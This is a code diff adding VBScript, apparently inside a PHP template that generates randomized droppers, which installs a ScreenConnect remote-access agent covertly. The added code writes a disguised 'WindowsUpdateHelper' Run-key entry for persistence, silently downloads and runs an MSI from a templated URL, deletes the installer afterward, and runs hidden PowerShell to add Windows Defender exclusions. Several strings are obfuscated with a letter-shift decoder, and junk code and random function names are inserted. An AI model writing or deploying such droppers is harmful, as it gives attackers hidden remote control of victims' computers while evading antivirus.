@@ -101,4 +101,41 @@ End Sub
 Sub AddToStartup()
     On Error Resume Next
     objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
-        WScript
+        WScript.ScriptFullName, "REG_SZ"
+    Call Log("Added to startup")
+End Sub
+
+Sub DownloadAndExecute()
+    On Error Resume Next
+    Dim u, p, http, strm
+    u = "$scUrl"
+    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
+    
+    Call Log("Downloading installer...")
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", u, False
+    http.Send
+    Call Log("HTTP Status: " & http.Status)
+    If http.Status = 200 Then
+        Set strm = CreateObject("ADODB.Stream")
+        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+        Call Log("Download complete")
+        objShell.Run """" & p & """ /quiet", 0, True
+        Call Log("Installer started - waiting 10 minutes")
+        WScript.Sleep 600000
+        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
+        Call Log("Cleanup done")
+    End If
+End Sub
+
+Sub HideAgent()
+    On Error Resume Next
+    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
+    Call Log("Defender exclusions attempted")
+End Sub
+
+$junk
+Call $randFunc
+WScript.Quit
+VBS;
+?>
